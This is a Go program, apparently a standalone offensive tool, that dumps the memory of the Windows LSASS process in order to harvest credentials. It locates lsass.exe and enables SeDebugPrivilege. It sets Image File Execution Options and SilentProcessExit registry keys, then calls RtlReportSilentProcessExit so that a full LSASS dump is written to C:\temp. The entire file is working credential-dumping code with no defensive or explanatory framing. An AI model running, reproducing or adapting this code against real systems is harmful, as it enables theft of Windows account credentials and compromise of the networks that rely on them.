package main

import (
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"log"
	"syscall"
	"unsafe"
)

/**
 * @Author: Ramoncjs
 * @Date: 2021/12/29
 **/

var _pid int

func findPid() {
	sHandle, err := windows.CreateToolhelp32Snapshot(0x00000002, 0)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer windows.Close(sHandle)

	var entry windows.ProcessEntry32

	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(sHandle, &entry)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	for {
		_ = windows.Process32Next(sHandle, &entry)
		if windows.UTF16ToString(entry.ExeFile[:]) == "lsass.exe" {
			_pid = int(entry.ProcessID)
			break
		}
	}

}

func setSeDebugPrivilege() {
	handle := windows.CurrentProcess()

	var token windows.Token
	err := windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	var luid windows.LUID
	name, _ := windows.UTF16FromString("SeDebugPrivilege")
	err = windows.LookupPrivilegeValue(nil, &name[0], &luid)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	var tokenprivileges windows.Tokenprivileges
	tokenprivileges.PrivilegeCount = 1
	tokenprivileges.Privileges[0].Luid = luid
	tokenprivileges.Privileges[0].Attributes = 0x00000002

	err = windows.AdjustTokenPrivileges(token, false, &tokenprivileges, uint32(unsafe.Sizeof(tokenprivileges)), nil, nil)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
}

func setSilentProcessExit() {
	//https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
	//https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit

	var reg_key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe"
	var reg_silent_process_exit_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe"

	regKey, _, err := registry.CreateKey(windows.HKEY_LOCAL_MACHINE, reg_key_path, registry.SET_VALUE)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer func(regKey registry.Key) {
		err := regKey.Close()
		if err != nil {
			log.Fatal("[-] " + err.Error())
		}
	}(regKey)

	err = regKey.SetDWordValue("GlobalFlag", 0x200)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	} else {
		log.Println("[+] SET FLG_MONITOR_SILENT_PROCESS_EXIT SUCCESS.")
	}

	{
		regSltKey, _, err := registry.CreateKey(windows.HKEY_LOCAL_MACHINE, reg_silent_process_exit_path, registry.SET_VALUE)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		}
		defer func(regSltKey registry.Key) {
			err := regSltKey.Close()
			if err != nil {
				log.Fatal("[-] " + err.Error())
			}
		}(regSltKey)

		err = regSltKey.SetDWordValue("ReportingMode", 0x02)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		} else {
			log.Println("[+] SET ReportingMode SUCCESS.")
		}

		err = regSltKey.SetStringValue("LocalDumpFolder", "C:\\temp")
		if err != nil {
			log.Fatal("[-] " + err.Error())
		} else {
			log.Println("[+] SET LocalDumpFolder SUCCESS.")
		}

		err = regSltKey.SetDWordValue("DumpType", 0x02)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		} else {
			log.Println("[+] SET DumpType SUCCESS.")
		}
	}
}

func main() {
	findPid()
	setSeDebugPrivilege()
	setSilentProcessExit()
	pHandle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(_pid))
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer func(fd windows.Handle) {
		err := windows.Close(fd)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		}
	}(pHandle)

	rtlReportSilentProcessExit := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlReportSilentProcessExit")
	_, _, err = rtlReportSilentProcessExit.Call(uintptr(pHandle), 0)
	if err != windows.ERROR_SUCCESS {
		log.Println("[-] " + err.Error())
	} else {
		log.Println("[+] SUCCESS! The dmp file has been saved in C:\\temp! ")
	}

}
